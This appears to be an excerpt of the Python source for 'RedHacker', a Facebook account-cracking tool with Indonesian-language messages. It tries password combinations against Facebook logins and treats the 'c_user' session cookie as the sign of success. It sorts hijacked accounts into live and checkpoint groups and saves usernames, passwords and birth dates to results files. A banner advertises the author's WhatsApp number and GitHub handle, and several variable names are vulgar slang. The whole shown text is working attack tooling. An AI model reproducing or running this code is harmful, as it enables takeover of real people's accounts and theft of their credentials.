...
def logo():
 ...
 ╚═╝     ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝\n{N} ▌│█║▌║▌║RedHacker FACEBOOK METHOD║▌║▌║█│▌{N} """)
    ...
    print(f"║{P}[{H}•{P}] Author    : RedHacker                  {N}║")



    print(f"║{P}[{H}•{P}] Whatsapp  : +917356268818           {N}║")



    print(f"║{P}[{H}•{P}] Github    : github.com/Aryan-Mfc {N}  ║")
...
def hasil(ok,cp):
    ...
    if len(ok) != 0 or len(cp) != 0:
        ...
        print(f'\n%s##################################################\n [%s✓%s] %sCRACK BY RedHacker RedHacker SC SELESAI...\n%s##################################################'%(N,H,N,H,N))
        ...
        if cek_cp =="":
            ...
            for memek in cp:
                ...
                jalan(f' {N}[{M}?{N}] Account : {K}{kontol.replace("[RedHacker-CP] ", "")}{N}')
                ...
                try:
                    ...
                    log_hasil(titid[0].replace("[RedHacker-CP] ", ""), titid[1])
...
###### CEK HASIL CRACK #####
        ...
        for memek in total:
            ...
            titid  = kontol.replace("[RedHacker-OK] ","\x1b[1;92m[RedHacker-OK] ").replace("[RedHacker-CP] ", "\x1b[1;93m[RedHacker-CP] ")
...
###### INFO UPDATE & UPGRADE SC #####
        ...
        if upd =="":
            ...
            os.system('xdg-open https://wa.me/917356268818?text=Hallo');time.sleep(2);exit()
    ...
    if "c_user" in session.cookies.get_dict():
        ...
        if(len(cek)==0):
            ...
            if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
                ...
                open('results/ERROR.txt', 'a').write(f"[RedHacker-CP] {user} • {pasw}\n")
            ...
            open(f'results/CP-DETEKTOR-{ha}-{op}-{ta}.txt', 'a').write(f"[RedHacker-CP] {user} • {pasw}\n")
        ...
        open('results/INVALID-OK.txt', 'a').write(f"[RedHacker-CP] {user} • {pasw}\n")
...
# PROSES CRACK METODE 3 in 1
            ...
            for pw in pasw:
                ...
                if "c_user" in session.cookies.get_dict():
                    ...
                    if "t" in Apk:
                        ...
                        print(f'\r %sRedHacker LIVE OK %s           	    \n Username : %s\n Password : %s%s'%(H,waktu,user,pw,N))
                    ...
                    try:
                        ...
                        print('\r %sRedHacker LIVE CP %s               \n Username : %s\n Password : %s\n Tanggal Lahir : %s %s %s%s\n'%(K,waktu,user,pw,day,month,year,N))



                        wrt = '[RedHacker-CP] %s • %s • %s %s %s' % (user,pw,day,month,year)
    ...
    def kombinasi_pw(self,url):
        ...
        if pw in[""]:
            ...
            print(" %s[%s!%s] Example : %ssayan,redhacker%s"%(N,M,N,H,N))
